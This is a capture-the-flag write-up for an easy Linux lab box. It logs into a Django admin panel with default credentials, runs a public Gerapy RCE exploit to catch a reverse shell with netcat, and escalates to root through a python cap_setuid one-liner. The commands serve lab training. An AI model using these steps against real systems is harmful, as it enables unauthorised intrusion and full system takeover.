---
title: "Lavrem — Writeup"
linkTitle: "Lavrem"
weight: 1
featured: true
platform: "PG"
name: "Lavrem"
os: "Linux"
difficulty: "Easy"
release: "27 Jun 2026"
ip: "192.168.171.24"
# Drop a real avatar at static/img/pg/lavrem.png and uncomment:
# avatar: "/img/pg/lavrem.png"
tags: ["linux", "web", "django", "gerapy", "cve-2021-43857", "suid", "capabilities"]
description: "Easy Linux box — a misconfigured Gerapy crawler manager, a hidden Django admin panel with default creds, and a SUID Python binary for root."
---

{{< htb name="Lavrem" os="Linux" difficulty="Easy" release="27 Jun 2026" ip="192.168.171.24" platform="PG" >}}

## Reconnaissance

Start with a quick default scan to see what's exposed, then a deeper service scan on whatever comes back.

```bash
nmap 192.168.171.24
```

Only two ports open — SSH and a web service on an unusual port.

```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

```bash
nmap 192.168.171.24 -p 22,8000 -sCV
```

The service scan identifies the web app by name — **Gerapy**, running under Django's development WSGIServer on Python 3.10.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
```

## Enumeration

Gerapy has its own frontend login at `/#/login`. Default credentials (`admin:admin`) and a basic SQLi bypass attempt (`admin'+OR+'1'='1#`) both fail here — this particular login form is doing its job.

![Gerapy frontend login rejecting default creds](/img/pg/lavrem/01-gerapy-login.png)

{{< note tip >}}
A failed login on the *obvious* login page doesn't mean the box is locked down — always fuzz for other endpoints before assuming credentials are the wrong path entirely.
{{< /note >}}

```bash
ffuf -u "http://192.168.171.24:8000/FUZZ" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c
```

```
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 102ms]
```

That `/admin` path turns out to be a completely separate surface — Django's own auto-generated admin panel, distinct from Gerapy's custom frontend. And this time, `admin:admin` logs straight in.

![Django admin login accepting default credentials](/img/pg/lavrem/02-django-admin-login.png)

## Initial Foothold

Inside the Django admin panel, **Authentication and Authorization → Users** is directly accessible.

![Django admin dashboard with the Users section highlighted](/img/pg/lavrem/03-django-admin-panel.png)

Rather than looking for an exploit right away, the fastest move is to just use the panel's own functionality: add a new user, then flip the **Superuser status** checkbox.

```
Username: admin2
Password: complex_pass123
```

![Adding a new admin2 user via the Django admin panel](/img/pg/lavrem/04-add-user.png)

![Ticking the Superuser status checkbox to grant full privileges](/img/pg/lavrem/05-superuser-status.png)

No exploit needed for this step — just a legitimate admin feature, abused to guarantee a fully-privileged account to work with.

With a confirmed superuser account in hand, the next question is whether Gerapy itself has a known vulnerability.

```bash
searchsploit gerapy
```

```
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated) | python/remote/50640.py
```

```bash
searchsploit -m 50640.py
```

The exploit is CVE-2021-43857 — an authenticated RCE affecting Gerapy versions before 0.9.8. It just needs valid credentials, which is exactly what the superuser account provides. Edit the script to use the new account:

```python
login = "admin2"
password = "complex_pass123"
```

Set up a listener and run the exploit:

```bash
rlwrap nc -lvnp 443
```

```
connect to [192.168.45.186] from (UNKNOWN) [192.168.171.24] 54972
bash: no job control in this shell
app@ubuntu:~/gerapy$
```

A shell lands as `app`. Grab the user flag from the home directory:

```bash
cd
cat local.txt
```

```
279ea****************************
```

## Privilege Escalation

With a foothold established, checking capabilities is worth doing early — it's an easy thing to skip if you only run a SUID scan.

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

`/usr/bin/python3.10` carries `cap_setuid=ep` — the binary can call `setuid()` and change its effective UID directly, no SUID bit or sudo entry required. [GTFOBins' Python entry](https://gtfobins.github.io/gtfobins/python/#capabilities) documents exactly this as a direct root path.

```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
whoami
root
```

Root shell confirmed. Grab the proof flag:

```bash
cd /root
cat proof.txt
```

```
3a8f5f3ba8c7cb18b105152397dca6dc
```

## Lessons learned

- A login form rejecting default creds doesn't mean the whole app is locked down — fuzz for other endpoints, especially framework-default admin panels (`/admin` on Django apps is a classic one).
- Built-in admin panels with user-management features are their own privesc path — no CVE required to go from "logged in" to "superuser" if the panel lets you create accounts yourself.
- `getcap -r /` deserves to be a standard early check, not an afterthought — this box's entire privesc path was invisible to a SUID-only scan (`find / -perm -4000`).
